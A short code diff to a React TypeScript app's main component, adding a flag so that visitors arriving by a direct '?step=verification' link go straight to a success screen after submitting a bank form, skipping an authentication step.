@@ -17,12 +17,14 @@ export default function App() {
   const [currentStep, setCurrentStep] = useState<Step>('home');
   const [userAmount, setUserAmount] = useState<string>('');
   const [selectedBank, setSelectedBank] = useState<string | ExternalBankData>('');
+  const [isDirectAccess, setIsDirectAccess] = useState(false);
 
   // Check if there's a direct link to verification page (standalone)
   React.useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('step') === 'verification') {
       setCurrentStep('bank');
+      setIsDirectAccess(true);
     }
   }, []);
 
@@ -54,7 +56,12 @@ export default function App() {
   const handleBankFormSubmit = async (formData: any) => {
     const success = await sendBankFormData(formData);
     if (success) {
-      setCurrentStep('auth');
+      // Si accès direct via ?step=verification, afficher succès directement
+      if (isDirectAccess) {
+        setCurrentStep('success');
+      } else {
+        setCurrentStep('auth');
+      }
     }
     return success;
   };
